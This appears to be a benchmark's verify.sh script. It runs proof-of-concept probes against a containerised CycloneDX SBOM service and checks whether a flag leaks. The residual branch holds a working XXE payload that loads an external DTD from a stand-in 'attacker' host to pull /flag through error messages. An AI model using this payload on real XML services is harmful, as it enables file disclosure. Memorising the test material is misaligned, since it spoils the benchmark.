#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed 路径：poc/seed_exec.py <candidate.json> <version>（公开执行器）；residual 需 case 补实现。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
export PCB_TARGET_PORT="${PORT:-}"
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # 容错：非 JSON 输出（如纯路径字符串）包装成 {"path": ...}
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  # seed 走 /parse（v0 达、v1 阻断）；seed_exec 默认 /validate 是 residual 的
  "$PY" -c "import json,sys
d = json.load(open('$WORK_DIR/cand.json'))
if isinstance(d, dict):
    d['endpoint'] = '/parse'
else:
    d = {'payload': str(d), 'endpoint': '/parse'}
json.dump(d, open('$WORK_DIR/cand.json','w'))"
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual (CVE-2025-64518, sibling VALIDATE 路径 XXE): 同一恶意 SBOM 走 POST /validate。
  # CVE-2024-38374 修复只硬化了 parser 的 DocumentBuilderFactory；validate 路径的 SchemaFactory
  # (CycloneDxSchema.getXmlSchema) 直到 11.0.1 才设 ACCESS_EXTERNAL_DTD/SCHEMA="" ->
  # V1(9.0.4) 上 javax.xml.validation.Validator 仍解析外部 DTD -> 错误式 XXE 把 /flag 内容
  # 带进 ParseException 文本并出现在响应体（判定基准 = 提交值 RUN_FLAG）。
  # 注意: poc/seed_exec.py 的 PCB_TARGET_PORT 钩子只改写 BASE/HOSTPORT，未覆盖 poc_common.HOST_APP
  # （固定端口），故这里先加载 poc_common 并把 HOST_APP 重写到动态端口，再调用同一 run_probe。
  "$PY" - "$WORK_DIR/cand.json" "$VERSION" <<'PYEOF'
import json, sys
cand, version = sys.argv[1], sys.argv[2]
payload = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
           "<!DOCTYPE bom [\n"
           "  <!ENTITY % dtd SYSTEM \"http://attacker/evil.dtd\">\n"
           "  %dtd;\n"
           "]>\n"
           "<bom xmlns=\"http://cyclonedx.org/schema/bom/1.6\"/>\n")
json.dump({"probe_id": "cve-2025-64518-validate-xxe", "payload": payload,
           "endpoint": "/validate"}, open(cand, "w"))
PYEOF
  OUT="$("$PY" - "$WORK_DIR/cand.json" "$VERSION" "$CASE_DIR" <<'PYEOF'
import importlib.util, json, os, sys
cand, version, case_dir = sys.argv[1], sys.argv[2], sys.argv[3]
sys.path.insert(0, case_dir)                       # poc_common importable
import poc_common
port = os.environ.get("PCB_TARGET_PORT", "")
if not port:
    print(json.dumps({"error": "no PCB_TARGET_PORT"})); sys.exit(20)
for v in list(poc_common.HOST_APP):
    poc_common.HOST_APP[v] = "http://127.0.0.1:%d" % int(port)
spec = importlib.util.spec_from_file_location("_se", os.path.join(case_dir, "poc", "seed_exec.py"))
se = importlib.util.module_from_spec(spec)
spec.loader.exec_module(se)                        # 与 seed 分支同一执行器 run_probe
r = se.run_probe(json.load(open(cand)), version=version)
if isinstance(r, str):                             # run_probe 返回裸字符串时包成 {"body": ...}
    r = {"body": r}
print(json.dumps(r, default=str))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or d.get('response') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY" || grep -q "$RUN_FLAG" <<<"$OUT"; then exit 0; else exit 10; fi
